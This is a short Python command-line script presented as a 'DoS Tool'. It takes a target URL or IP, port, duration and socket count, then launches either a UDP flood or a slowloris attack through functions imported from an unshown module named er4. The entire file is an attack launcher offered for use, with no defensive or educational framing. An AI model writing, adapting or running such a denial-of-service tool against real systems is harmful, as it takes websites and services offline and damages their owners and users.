import er4
import sys
import argparse

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="DoS Tool by Eray Aynaci")
    parser.add_argument("-u","--url",required=False,help="Target URL example.com")
    parser.add_argument("-t","--target",required=False,help="Target IP adress")
    parser.add_argument("-p","--port",required=False,default=80,help="Target port [Default 80]",type=int)
    parser.add_argument("-d","--duration",required=False,default=100,help="Attack duration(second) [Default 100]",type=float)
    parser.add_argument("-s","--socket",required=False,default=100,help="Number of sockets [Default 100]",type=int)
    parser.add_argument("-udp","--udpflood",required=False,default=False,action="store_true",help="Target type")
    parser.add_argument("-sl","--slowloris",required=False,default=False,action="store_true",help="Target type")
    a = vars(parser.parse_args())
    
    if a["udpflood"] == True and a["slowloris"] == False:
        er4.udp_flood(a["target"],a["port"],a["duration"])
    elif a["udpflood"] == False and a["slowloris"] == True:
        for i in range(a["socket"]):
            er4.slowloris(a["url"],a["port"])
            print(str(i)+" . socket is sending")
    else:
        print("Wrong attack type choosing.")
        sys.exit()         
